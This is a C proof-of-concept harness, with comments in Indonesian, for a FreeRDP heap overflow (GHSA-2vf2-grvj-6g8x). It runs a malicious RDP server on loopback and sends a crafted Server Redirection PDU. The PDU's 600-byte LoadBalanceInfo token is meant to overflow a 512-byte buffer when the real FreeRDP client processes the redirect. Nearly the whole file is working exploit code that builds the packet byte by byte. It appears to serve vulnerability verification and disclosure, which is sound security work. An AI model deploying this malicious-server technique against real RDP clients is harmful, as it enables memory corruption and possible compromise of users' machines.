/*
 * harness_remote.c — BLOK 5: REACHABILITY REMOTE (bukan panggilan API internal).
 *
 * Yang dibuktikan: overflow `nego` (GHSA-2vf2-grvj-6g8x) bisa dipicu oleh DATA DARI JARINGAN.
 * Di sini kita berperan sebagai server RDP yang jahat di loopback dan memakai klien FreeRDP
 * yang asli (`freerdp_connect`) untuk memprosesnya:
 *
 *   1. klien menyambung ke 127.0.0.1:<port> (server kita), mengirim X.224 Connection Request
 *   2. server kita menjawab dengan "Enhanced Security Server Redirection PDU" (MS-RDPBCGR 2.2.13.4)
 *      yang membawa LoadBalanceInfo = token 600 byte   ← seluruhnya datang dari socket
 *   3. klien memprosesnya sendiri: redirection.c → rdp_redirection_apply_settings()
 *      → rdp_client_redirect() → nego_set_routing_token(600 byte) → menyambung ke target
 *      → nego_send_negotiation_request() MENULIS 600 byte ke stream 512 byte → overflow
 *
 * Harness ini TIDAK memanggil nego_set_routing_token / nego_send_negotiation_request sendiri;
 * satu-satunya sumber data adalah byte yang kami kirim lewat TCP. Dibangun dengan ASan supaya
 * overflow-nya dilaporkan beserta jejak tumpukan yang membuktikan asalnya dari jalur redirection.
 *
 * Detail wire (dibaca dari sumber FreeRDP, bukan tebakan):
 *   TPKT(4: 03 00 len) + X.224 DT(3: 02 F0 80)
 *   pad2Octets(2)                      ← dilewati Stream_SafeSeek(s,2)
 *   flags(2)   == SEC_REDIRECTION_PKT 0x0400
 *   length(2)  (hanya dicatat pembaca)
 *   sessionID(4) + redirFlags(4)
 *   [flag & LB_TARGET_NET_ADDRESS] TargetNetAddress : UINT32 len + UTF-16LE + NUL
 *   [flag & LB_LOAD_BALANCE_INFO ]  LoadBalanceInfo : UINT32 len + bytes
 */
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <winpr/wlog.h>

#define TOKEN_LEN 600
#define SEC_REDIRECTION_PKT 0x0400
#define LB_TARGET_NET_ADDRESS 0x00000001
#define LB_LOAD_BALANCE_INFO 0x00000002
#define REDIR_TARGET_PORT 3389

static unsigned char g_pdu[8192];
static int g_pdu_len = 0;
static int g_lfd_primary = -1;
static int g_lfd_target = -1;
static volatile int g_pdu_sent = 0;
static volatile int g_followup_seen = 0;

/* ---------- penyusun byte ---------- */
static void put_u16(unsigned char** p, unsigned v)
{
	(*p)[0] = (unsigned char)(v >> 8);
	(*p)[1] = (unsigned char)(v & 0xff);
	*p += 2;
}
static void put_u32(unsigned char** p, unsigned v)
{
	(*p)[0] = (unsigned char)((v >> 24) & 0xff);
	(*p)[1] = (unsigned char)((v >> 16) & 0xff);
	(*p)[2] = (unsigned char)((v >> 8) & 0xff);
	(*p)[3] = (unsigned char)(v & 0xff);
	*p += 4;
}

static void build_redirection_pdu(const char* addr, const unsigned char* token, unsigned token_len)
{
	unsigned char body[8192];
	unsigned char* p = body;
	const size_t alen = strlen(addr);
	const size_t ulen = (alen + 1) * 2; /* UTF-16LE + NUL terminator */

	put_u16(&p, 0x0000); /* pad2Octets — dilewati pembaca */
	put_u16(&p, SEC_REDIRECTION_PKT);
	unsigned char* len_field = p;
	put_u16(&p, 0); /* placeholder length */
	put_u32(&p, 0x00000000); /* sessionID */
	put_u32(&p, LB_TARGET_NET_ADDRESS | LB_LOAD_BALANCE_INFO);

	/* TargetNetAddress (RDP_STRING: UINT32 len + UTF-16LE, harus diakhiri NUL & panjang genap) */
	put_u32(&p, (unsigned)ulen);
	for (size_t i = 0; i <= alen; i++)
	{
		*p++ = (unsigned char)addr[i];
		*p++ = 0x00;
	}
	/* LoadBalanceInfo (UINT32 len + bytes) — inilah token yang dikendalikan server */
	put_u32(&p, token_len);
	memcpy(p, token, token_len);
	p += token_len;

	{
		const unsigned pkt_len = (unsigned)(p - body - 2); /* dari `flags` sampai akhir */
		len_field[0] = (unsigned char)(pkt_len >> 8);
		len_field[1] = (unsigned char)(pkt_len & 0xff);
	}

	{
		const unsigned total = (unsigned)(4 + 3 + (p - body));
		unsigned char* q = g_pdu;
		q[0] = 0x03;
		q[1] = 0x00;
		q[2] = (unsigned char)(total >> 8);
		q[3] = (unsigned char)(total & 0xff);
		q += 4;
		q[0] = 0x02; /* X.224 Data TPDU */
		q[1] = 0xF0;
		q[2] = 0x80;
		q += 3;
		memcpy(q, body, (size_t)(p - body));
		g_pdu_len = (int)total;
	}
}

static int listen_on(int port, int* got_port)
{
	const int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return -1;
	{
		int one = 1;
		(void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	}
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sa.sin_port = htons((uint16_t)port);
	if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0)
	{
		close(fd);
		return -1;
	}
	if (listen(fd, 4) < 0)
	{
		close(fd);
		return -1;
	}
	{
		socklen_t sl = sizeof(sa);
		if (getsockname(fd, (struct sockaddr*)&sa, &sl) == 0 && got_port)
			*got_port = ntohs(sa.sin_port);
	}
	return fd;
}

/* ---------- server RDP jahat ---------- */
static void* server_thread(void* arg)
{
	const int primary = ((int)(intptr_t)arg) == 0;
	for (int round = 0; round < 2; round++)
	{
		const int lfd = primary ? g_lfd_primary : g_lfd_target;
		if (lfd < 0)
			return NULL;
		const int cfd = accept(lfd, NULL, NULL);
		if (cfd < 0)
			return NULL;
		{
			char buf[2048];
			const ssize_t n = read(cfd, buf, sizeof(buf)); /* X.224 CR dari klien */
			printf("  [server%s] koneksi #%d: %zd byte dari klien\n", primary ? " utama" : " target",
			       round + 1, n);
			fflush(stdout);
		}
		if (primary && round == 0)
		{
			const ssize_t w = write(cfd, g_pdu, (size_t)g_pdu_len);
			printf("  [server utama] PDU redirection terkirim (%d byte, tulis=%zd)\n", g_pdu_len, w);
			fflush(stdout);
			g_pdu_sent = 1;
		}
		else
		{
			printf("  [server] klien menyusun permintaan berikutnya → inilah saat token ditulis\n");
			fflush(stdout);
			g_followup_seen = 1;
		}
		{
			const struct timespec ts = {0, 600000000L};
			nanosleep(&ts, NULL);
		}
		close(cfd);
	}
	return NULL;
}

static void on_alarm(int sig)
{
	(void)sig;
	const char* m = "\n[x] batas waktu 90 s tercapai (klien tak sampai menulis token)\n";
	(void)!write(1, m, strlen(m));
	_exit(4);
}

int main(void)
{
	WLog_SetLogLevel(WLog_GetRoot(), WLOG_ERROR);
	{
		struct sigaction sa;
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = on_alarm;
		sigaction(SIGALRM, &sa, NULL);
		alarm(90);
	}

	unsigned char token[TOKEN_LEN];
	memset(token, 0x41, sizeof(token));
	memcpy(token, "Cookie: mstshash=poc\r\n", 22);
	/* penanda supaya jelas di log bahwa byte ini kami yang tentukan */
	memcpy(token + 24, "VULNRES-REMOTE-TOKEN", 20);

	printf("harness remote — server RDP jahat loopback → klien FreeRDP memproses redirect\n");

	int port_primary = 0;
	g_lfd_primary = listen_on(0, &port_primary);
	if (g_lfd_primary < 0)
	{
		printf("  [x] gagal membuka listener utama\n");
		return 3;
	}
	g_lfd_target = listen_on(REDIR_TARGET_PORT, NULL); /* target redirect (port bisa kembali ke 3389) */
	printf("  listener utama : 127.0.0.1:%d (menerima PDU redirection)\n", port_primary);
	printf("  listener target: 127.0.0.1:%d %s\n", REDIR_TARGET_PORT,
	       g_lfd_target >= 0 ? "(siap)" : "(tak bisa dibuka, diabaikan)");

	build_redirection_pdu("127.0.0.1", token, TOKEN_LEN);
	printf("  PDU redirection: %d byte — ", g_pdu_len);
	for (int i = 0; i < 24; i++)
		printf("%02x ", g_pdu[i]);
	printf("…\n");
	printf("  LoadBalanceInfo (token) = %d byte, dikirim HANYA lewat socket\n", TOKEN_LEN);
	fflush(stdout);

	pthread_t t1, t2;
	pthread_create(&t1, NULL, server_thread, (void*)(intptr_t)0);
	if (g_lfd_target >= 0)
		pthread_create(&t2, NULL, server_thread, (void*)(intptr_t)1);
	else
		t2 = 0;

	freerdp* instance = freerdp_new();
	if (!instance)
		return 3;
	instance->ContextSize = sizeof(rdpContext);
	if (!freerdp_context_new(instance))
		return 3;
	rdpSettings* settings = instance->context->settings;
	if (!settings)
		return 3;
	freerdp_settings_set_string(settings, FreeRDP_ServerHostname, "127.0.0.1");
	freerdp_settings_set_uint32(settings, FreeRDP_ServerPort, (UINT32)port_primary);
	freerdp_settings_set_string(settings, FreeRDP_Username, "poc");
	freerdp_settings_set_uint32(settings, FreeRDP_TcpConnectTimeout, 10000);

	printf("  [klien] freerdp_connect → 127.0.0.1:%d (server jahat kita)\n", port_primary);
	fflush(stdout);
	const BOOL ok = freerdp_connect(instance);
	printf("  [klien] freerdp_connect kembali: %s (PDU terkirim=%d, koneksi lanjutan=%d)\n",
	       ok ? "TRUE" : "FALSE", g_pdu_sent, g_followup_seen);
	fflush(stdout);

	freerdp_disconnect(instance);
	freerdp_context_free(instance);
	freerdp_free(instance);
	if (t2)
		pthread_join(t2, NULL);
	pthread_join(t1, NULL);

	if (!g_pdu_sent)
	{
		printf("  [x] PDU tak pernah terkirim — tak mengklaim apa pun\n");
		return 1;
	}
	printf("  [i] tak ada laporan ASan: overflow tidak terpicu pada jalur ini\n");
	return 1;
}
